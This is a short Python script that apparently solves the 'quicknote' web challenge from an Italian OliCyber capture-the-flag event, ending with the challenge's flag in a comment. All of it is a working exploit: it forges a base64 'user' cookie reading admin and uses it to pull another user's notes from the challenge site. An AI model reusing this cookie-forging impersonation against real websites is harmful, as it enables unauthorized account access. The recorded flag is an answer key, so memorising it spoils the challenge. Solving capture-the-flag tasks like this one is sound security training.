import requests

s = requests.session()
site = "http://quicknote.challs.olicyber.it/"
cookie = {"user" : "eyJ1c2VybmFtZSI6ICJhZG1pbiJ9"} #username:admin

login = s.get(f"{site}/create?username=abcdef123&content=Ciao")
r = s.get(f"{site}/get", cookies=cookie).text
print(r)

#ITASEC{c00ki3s_c4n_b3_ch4ng3d_f0r_big_r3w4rds}